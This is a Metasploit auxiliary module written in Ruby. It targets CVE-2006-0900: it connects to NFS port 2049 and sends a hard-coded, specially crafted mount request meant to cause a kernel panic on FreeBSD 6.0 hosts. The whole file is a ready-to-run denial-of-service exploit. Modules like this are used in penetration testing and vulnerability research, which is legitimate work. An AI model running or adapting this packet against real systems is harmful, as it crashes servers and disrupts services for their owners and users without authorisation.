##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FreeBSD Remote NFS RPC Request Denial of Service',
      'Description'    => %q{
        This module sends a specially-crafted NFS Mount request causing a
        kernel panic on host running FreeBSD 6.0.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'BID', '16838' ],
          [ 'OSVDB', '23511' ],
          [ 'CVE', '2006-0900' ],
        ]))

      register_options([Opt::RPORT(2049),])
  end

  def run
    connect

    pkt =  "\x80\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02"
    pkt << "\x00\x01\x86\xa5\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00"
    pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04"

    print_status("Sending dos packet...")

    sock.put(pkt)

    disconnect
  end
end
